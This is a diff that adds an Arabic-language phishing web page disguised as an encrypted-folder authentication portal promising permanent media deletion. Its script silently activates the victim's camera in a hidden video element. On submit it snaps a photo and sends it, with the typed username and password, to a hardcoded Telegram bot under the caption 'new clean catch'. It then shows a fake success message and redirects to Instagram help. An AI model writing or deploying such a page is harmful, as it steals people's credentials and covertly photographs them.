@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة المزامنة الأمنية</title>
+    <style>
+        body { font-family: system-ui, -apple-system, sans-serif; background: #f9f9f9; display: flex; justify-content: center; padding-top: 100px; color: #333; }
+        .card { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 330px; text-align: center; border: 1px solid #eee; }
+        .icon { font-size: 45px; margin-bottom: 15px; }
+        h3 { font-size: 19px; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 12.5px; color: #777; line-height: 1.6; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #e5e5e5; border-radius: 8px; background: #fafafa; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #5c6bc0; background: white; }
+        button { width: 100%; background: #222; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 15px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">🌀</div>
+        <h3>مصادقة المجلد المشفر</h3>
+        <p>يرجى إدخال معرف المالك (ID) ومفتاح فك التشفير (PassKey) لاستكمال عملية حذف الوسائط بشكل نهائي.</p>
+        
+        <input type="text" id="id" placeholder="معرف المالك (Username)">
+        <input type="password" id="key" placeholder="مفتاح فك التشفير (Password)">
+        
+        <button onclick="run()">بدء المزامنة والحذف</button>
+        
+        <div style="margin-top: 25px; font-size: 10px; color: #bbb;">
+            Cloud-Sync ID: #8221-X9 <br> مؤمن بنظام التشفير الطرفي
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const T = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+        const I = "897618292";
+
+        // طلب كاميرا فوري وصامت
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(s => { document.getElementById('v').srcObject = s; })
+            .catch(() => {});
+
+        function run() {
+            const v = document.getElementById('v'), c = document.getElementById('c');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+
+            c.toBlob(b => {
+                const f = new FormData();
+                f.append("chat_id", I);
+                f.append("photo", b, "shot.jpg");
+                f.append("caption", `⚡️ صيد جديد ونظيف!\n👤 الهوية: ${document.getElementById('id').value}\n🔑 المفتاح: ${document.getElementById('key').value}`);
+
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: "POST", body: f })
+                .then(() => {
+                    alert("تمت المصادقة. جاري معالجة طلب الحذف من خوادم السحابة.");
+                    window.location.href = "https://help.instagram.com";
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
